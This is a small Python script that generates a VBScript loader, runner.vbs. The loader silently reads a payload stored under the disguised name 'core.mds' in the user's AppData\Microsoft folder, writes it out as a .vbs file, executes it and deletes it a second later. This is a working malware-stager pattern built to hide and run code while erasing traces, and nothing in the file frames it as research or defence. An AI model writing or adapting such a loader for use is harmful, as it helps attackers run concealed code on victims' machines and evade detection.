class Runner:
	var = []
	whole_code = ""
	vbs_code = []

	def __init__(self):
		pass

	def get_runner_lines(self):
		self.vbs_code.append('On Error Resume Next')
		self.vbs_code.append('Set fso = CreateObject(\"\"Scripting.FileSystemObject\"\")')
		self.vbs_code.append('Set oShell = CreateObject(\"\"WScript.Shell\"\")')
		self.vbs_code.append('app_path = oShell.ExpandEnvironmentStrings(\"\"%APPDATA%\"\") + \"\"\\Microsoft\\\"\"')
		self.vbs_code.append('Set oFile = fso.OpenTextFile(app_path & \"\"core.mds\"\")')
		self.vbs_code.append('core_code = oFile.ReadAll : oFile.Close')
		self.vbs_code.append('Set oFile = fso.CreateTextFile(app_path & \"\"core.vbs\"\", True)')
		self.vbs_code.append('oFile.Write core_code : oFile.Close')
		self.vbs_code.append('oShell.Run app_path & \"\"core.vbs\"\"')
		self.vbs_code.append('WScript.Sleep 1000')
		self.vbs_code.append('fso.DeleteFile app_path & \"\"core.vbs\"\"')

	def get_whole_code(self):
		for line in self.vbs_code:
			self.whole_code += line + " : "

	def save_to_file(self, file_name):
		with open(file_name, 'w') as fw:
			fw.write(self.whole_code)
		



def main():
	runner = Runner()
	runner.get_runner_lines()
	runner.get_whole_code()
	runner.save_to_file("runner.vbs")

if __name__ == '__main__':
	main()